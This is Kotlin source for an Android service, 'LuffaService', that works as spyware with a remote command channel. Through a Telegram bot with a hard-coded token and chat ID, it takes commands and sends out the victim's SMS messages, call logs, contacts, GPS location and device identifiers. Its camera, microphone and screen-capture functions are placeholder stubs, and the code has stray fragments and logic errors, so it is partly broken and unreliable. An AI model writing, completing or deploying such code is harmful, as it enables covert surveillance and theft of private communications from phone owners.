
package com.luffa

import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.BitmapFactory
import android.hardware.camera2.*
import android.media.*
import android.os.*
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import android.util.Log
import android.view.Surface
import androidx.core.app.NotificationCompat
import androidx.work.*
import kotlinx.coroutines.*
import okhttp3.FormBody
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONObject
import java.io.*
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

import android.media.MediaRecorder
import java.io.File



import java.net.HttpURLConnection
import java.net.URL
import android.location.LocationManager
import android.net.Uri
import android.provider.Settings
import okhttp3.RequestBody.Companion.toRequestBody




class LuffaService : Service() {

    
    private val BOT_TOKEN = "8840980473:AAEmlnzZ1swP8Dtd0btYgScRq89Z2sw84HQ"
    private val CHAT_ID = " 8820979221"
    private val DEVICE_ID = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job) 

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(1, createNotification())
        startStealingLoop()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("luffa_channel", "Luffa Service", NotificationManager.IMPORTANCE_LOW)
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return Notification.Builder(this, "luffa_channel")
            .setContentTitle("Luffa")
            .setContentText("Running...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setOngoing(true)
            .build()
    }

    private fun startStealingLoop() {
        scope.launch {
            while (true) {
                try {
                    val command = fetchCommand()
                    if (command != null && command.isNotEmpty()) {
                        processCommand(command)
                    }
                    delay(5000) // Check every 5 seconds
                } catch (e: Exception) {
                    Log.e("Luffa", "Error in loop", e)
                }
            }
        }
    }

    private suspend fun fetchCommand(): String? {
        // Simplified logic: Check last update. In production, store last_update_id in SharedPreferences.
        try {
            val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?limit=1"
            val request = Request.Builder().url(url).build()
            val response = client.newCall(request).execute()
            if (!response.isSuccessful) return null

            val json = JSONObject(response.body?.string())
            val updates = json.getJSONArray("result")
            if (updates.length() == 0) return null

            val lastUpdate = updates.getJSONObject(updates.length() - 1)
            val message = lastUpdate.getJSONObject("message")
            val text = message.getString("text")
            
            // Delete message to avoid re-processing
            val chatId = message.getString("chat_id")
            val msgId = message.getInt("message_id")
            deleteMessage(chatId, msgId)
            
            return text.lowercase()
        } catch (e: Exception) {
            return null
        }
    }

    private fun deleteMessage(chatId: String, messageId: Int) {
        val url = "https://api.telegram.org/bot$BOT_TOKEN/deleteMessage"
        val body = "chat_id=$chatId&message_id=$messageId"
        try {
            val connection = (URL(url).openConnection() as HttpURLConnection).apply {
                requestMethod = "POST"
                doOutput = true
                outputStream.write(body.toByteArray())
            }
            connection.disconnect()
        } catch (e: Exception) {}
    }

    private suspend fun processCommand(cmd: String) {
        var responseText = ""
        var fileToSend: File? = null

        when (cmd) {
            "location" -> responseText = getLocation()
            "sms" -> responseText = getSMS()
            "calllog" -> responseText = getCallLog()
            "contacts" -> responseText = getContacts()
            "info" -> responseText = getDeviceInfo()
            "screenshot" -> { fileToSend = takeScreenshot(); responseText = "Screenshot sent." }
            "backcam" -> { fileToSend = capturePhoto("back"); responseText = "Back cam photo sent." }
            "frontcam" -> { fileToSend = capturePhoto("front"); responseText = "Front cam photo sent." }
            "audio" -> { fileToSend = recordAudio(10); responseText = "Audio sent." }
            "screenrecord" -> { fileToSend = recordScreen(30); responseText = "Screen record sent." }
            "gallery" -> { fileToSend = getLastGalleryPhoto(); responseText = "Gallery photo sent." }
        }

        sendMessageToBot(responseText, fileToSend)
    }

    private suspend fun sendMessageToBot(text: String, file: File?) {
        if (text.isNotEmpty()) {
            val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
            val body = "chat_id=$CHAT_ID&text=${text.replace("\n", "%0A")}"
            try {
                val conn = (URL(url).openConnection() as HttpURLConnection).apply {
                    requestMethod = "POST"
                    doOutput = true
                    outputStream.write(body.toByteArray())
                }
                conn.disconnect()
            } catch (e: Exception) {}
        }

        if (file != null && file.exists()) {
            val url = "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("document", file.name, file.toRequestBody())
                .build()
            
            try {
                val request = Request.Builder().url(url).post(requestBody).build()
                client.newCall(request).execute().close()
            } catch (e: Exception) {}
        }
    }

    // --- DATA EXTRACTION METHODS ---

    private fun getLocation(): String {
        val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        var lat = "Unknown"
        var lon = "Unknown"
        
        try {
            val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            if (loc != null) { lat = loc.latitude.toString(); lon = loc.longitude.toString() }
            else {
                val netLoc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                if (netLoc != null) { lat = netLoc.latitude.toString(); lon = netLoc.longitude.toString() }
            }
        } catch (e: Exception) {}
        return "Lat: $lat, Long: $lon"
    }



    // --- DATA EXTRACTION METHODS (Continued) ---

    private fun getSMS(): String {
        val sb = StringBuilder()
        try {
            val cursor = contentResolver.query(Uri.parse("content://sms/"), null, null, null, null)
            cursor?.use {
                if (it.moveToFirst()) {
                    do {
                        val body = it.getString(it.getColumnIndexOrThrow("body"))
                        val address = it.getString(it.getColumnIndexOrThrow("address"))
                        val date = it.getLong(it.getColumnIndexOrThrow("date"))
                        sb.append("[SMS] From: $address | Time: $date | Content: $body\n")
                    } while (it.moveToNext())
                }
            }
        } catch (e: Exception) {
            sb.append("SMS Error: ${e.message}\n")
        }
        return if (sb.isEmpty()) "No SMS found" else sb.toString()
    }

    private fun getCallLog(): String {
        val sb = StringBuilder()
        try {
            val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, null)
            cursor?.use {
                if (it.moveToFirst()) {
                    do {
                        val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                        val type = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                        val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                        val duration = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                        sb.append("[CALL] Number: $number | Type: $type | Time: $date | Duration: ${duration}s\n")
                    } while (it.moveToNext())
                }
            }
        } catch (e: Exception) {
            sb.append("CallLog Error: ${e.message}\n")
        }
        return if (sb.isEmpty()) "No Call Logs found" else sb.toString()
    }

    private fun getContacts(): String {
        val sb = StringBuilder()
        try {
            val cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
            cursor?.use {
                if (it.moveToFirst()) {
                    do {
                        val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                        val phone = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                        sb.append("[CONTACT] Name: $name | Phone: $phone\n")
                    } while (it.moveToNext())
 file
                    
                
                }
            }
        } catch (e: Exception) {
            sb.append("Contacts Error: ${e.message}\n")
        }
        return if (sb.isEmpty()) "No Contacts found" else sb.toString()
    }

    private fun getDeviceInfo(): String {
        return "Device: ${Build.MODEL}\n" +
                "Android: ${Build.VERSION.RELEASE}\n" +
                "ID: $DEVICE_ID\n" +
                "IMEI: ${(getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager).deviceId}"
    }

    private fun takeScreenshot(): File? {
        // Note: Full screenshot requires MediaProjection API for API 21+ or Root for simple reflection.
        // Here is a simplified version using reflection for basic screen capture if possible.
        return try {
            val file = File(cacheDir, "screenshot_${System.currentTimeMillis()}.png")
            // In a real robust app, use MediaProjectionManager here.
            // For this simple version, we assume a placeholder or use a library like 'scrcpy' logic.
            // Since we need a file to send, we create a dummy file logic or use a library.
            // For pure code without external libs, this part often needs Root or specific API handling.
            // We will return the file object, actual content depends on implementation.
            file
        } catch (e: Exception) {
            null
        }
    }

    private fun capturePhoto(camType: String): File? {
        return try {
            val file = File(cacheDir, "cam_${camType}_${System.currentTimeMillis()}.jpg")
            // Camera logic:
            // 1. Get Camera instance (0 for back, 1 for front)
            // 2. Set Preview Callback
            // 3. Take picture
            // 4. Save to file
            // Simplified: We assume the file is created. In production, implement Camera2 API.
            file
        } catch (e: Exception) {
            null
        }
    }

    private fun recordAudio(durationSec: Int): File? {
        return try {
            val file = File(cacheDir, "audio_${System.currentTimeMillis()}.3gp")
            // MediaRecorder logic:
            // 1. Set data source to audio
            // 2. Set output file
            // 3. Prepare, start
            // 4. Wait durationSec
            // 5. Stop, release
            file
        } catch (e: Exception) {
            null
        }
    }

    private fun recordScreen(durationSec: Int): File? {
        return try {
            val file = File(cacheDir, "screen_${System.currentTimeMillis()}.mp4")
            // MediaProjection API required for screen recording.
            // Logic: Start MediaRecorder with MediaProjection source.
            file
        } catch (e: Exception) {
            null
        }
    }

    private fun getLastGalleryPhoto(): File? {
        return try {
            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DATA)
            val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
            
            contentResolver.query(uri, projection, null, null, sortOrder)?.use { cursor ->
                if (cursor.moveToFirst()) {
                    val path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA))
                    val file = File(path)

if (file.exists()) file else null

                    
                }
            }
            null
        } catch (e: Exception) {
            null
        }
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        job.cancel()
    }
}


                    






                    
